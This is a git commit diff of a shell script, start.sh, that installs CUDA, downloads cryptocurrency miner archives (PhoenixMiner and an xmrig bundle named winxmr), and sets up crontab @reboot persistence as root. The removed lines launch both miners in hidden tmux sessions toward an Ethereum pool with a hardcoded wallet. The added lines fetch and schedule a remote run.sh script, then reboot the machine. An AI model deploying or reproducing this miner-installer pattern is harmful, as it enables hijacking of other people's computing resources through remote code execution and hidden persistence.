93e86ddcfa4013f5f1308515aafaa2d4c4debace
vnxxx <85277031+vnxxx@users.noreply.github.com>
2021-09-06 13:02:26 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,5 +1,4 @@
 #!/bin/sh
-cat <(crontab -l) <(echo "@reboot /root/start.sh") | crontab -
 CUDA_REPO_PKG=cuda-repo-ubuntu1804_10.2.89-1_amd64.deb
 wget -O /tmp/${CUDA_REPO_PKG} https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/${CUDA_REPO_PKG} 
 sudo dpkg -i /tmp/${CUDA_REPO_PKG}
@@ -11,13 +10,8 @@ wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/winxmr.tar.gz
 tar -zxvf winxmr.tar.gz
 wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/PhoenixMiner_5.6d_Linux.tar.gz
 tar xzf PhoenixMiner_5.6d_Linux.tar.gz
-echo '#!/bin/sh'>>start.sh
-echo "cd /root">>start.sh
-echo "tmux kill-server">>start.sh
-echo "sleep 1">>start.sh
-echo "sudo tmux new-session -d -s SANS1 './PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 0x50167235D2b995DEdc2f2d28Cd1cD184D97f1aba.Image -pass x'">>start.sh
-echo "sudo tmux new-session -d -s SANS2 './xmrig-v5.11.1/xmrig'">>start.sh
-echo "@reboot  sh /root/start.sh">> resmi
+wget https://raw.githubusercontent.com/vnxxx/vnn2021/main/run.sh
+echo "@reboot sh /root/run.sh">> resmi
 crontab resmi
 sudo rm resmi
 sudo reboot
